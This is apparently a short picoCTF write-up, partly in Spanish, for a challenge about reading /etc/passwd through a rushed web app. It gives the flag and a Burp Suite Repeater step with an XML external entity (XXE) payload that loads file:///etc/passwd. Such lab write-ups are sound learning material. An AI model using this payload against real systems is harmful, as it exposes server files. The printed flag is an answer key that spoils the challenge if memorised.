## Descripción

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

Additional details will be available after launching your challenge instance.
## Solución

**picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e}**
## Notas Adicionales

con burpsuite en el proxy solo es ver la accion que hace cada boton, ese puede ser modificado en el burpsuite en la parte de Repeater  con <!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<ID>
	&xxe;
</ID>
## Referencias
https://www.youtube.com/watch?v=KqoYNr-dG_w
